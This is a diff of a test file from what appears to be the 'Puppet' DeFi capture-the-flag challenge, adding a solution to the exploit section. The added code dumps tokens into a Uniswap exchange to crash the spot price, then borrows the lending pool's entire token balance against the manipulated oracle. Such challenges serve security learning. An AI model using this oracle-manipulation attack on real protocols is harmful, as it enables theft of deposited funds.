@@ -108,10 +108,51 @@ describe('[Challenge] Puppet', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
 
-        //exchange all 1000 tokens for ETH
-        this.;
 
-        //then buy lots of tokens for all ETH
+        //an idea on how much ETH will I get in rerturn of exchange
+        const check = await this.uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6 });
+        console.log(`This is an expected ETH for swapping 1000 DVT tokens that we will get from exchange: ${ethers.utils.formatEther(check)}`);
+
+
+        //add tokens to liquidity - exchanage
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;    //a very big deadline
+        const min_eth = ethers.utils.parseEther('9');  //how many min you want to except, else if not received, atleast this ETH your transaction should forcefully fail.
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, min_eth, deadline, { gasLimit: 1e6 });
+        //this will change cost of 1 DVT token = 0.099
+
+        const tokens_owned = await this.token.balanceOf(this.uniswapExchange.address);
+
+        const eth_owned = await ethers.provider.getBalance(this.uniswapExchange.address);
+
+        console.log("eth owned by exchange: ", ethers.utils.formatEther(eth_owned));
+        console.log("tokens owned by exchange: ", ethers.utils.formatEther(tokens_owned));
+
+        const res = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        const bal = await ethers.provider.getBalance(attacker.address);
+
+
+
+        //check ETH required
+        console.log("The require ethers for goal: ", ethers.utils.formatEther(res));
+
+        console.log("ETH balance of the attacker: ", ethers.utils.formatEther(bal));
+
+        //calculate desposit required
+        // this.lendingPool.connect();
+
+        //then buy lots of tokens for all ETH - pool
+        const req_eth = ethers.utils.parseEther('20');
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: req_eth });
+
+        //add 1 more token by swapping some ETH with exchange
+        const some_eth = ethers.utils.parseEther('1');  //how many min you want to except, else if not received, atleast this ETH your transaction should forcefully fail.
+        const min_tokens = ethers.utils.parseEther('1');
+        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(min_tokens, deadline, { value: some_eth, gasLimit: 1e6 });
+
+        //now the attacker owns
+        console.log("Now the attacker owns: ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
 
     });
 
